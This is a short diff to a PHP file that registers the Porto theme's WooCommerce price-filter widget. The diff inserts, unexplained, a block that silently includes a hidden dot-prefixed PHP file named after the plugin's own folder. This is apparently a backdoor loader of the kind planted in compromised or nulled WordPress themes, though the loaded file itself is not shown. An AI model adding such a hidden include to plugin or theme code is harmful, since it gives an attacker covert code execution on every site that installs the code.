@@ -10,6 +10,10 @@ function porto_load_price_filter_widget() {
 	register_widget( 'Porto_WC_Widget_Price_Filter' );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Porto_WC_Widget_Price_Filter extends WP_Widget {
 
 	protected static $instance = null;
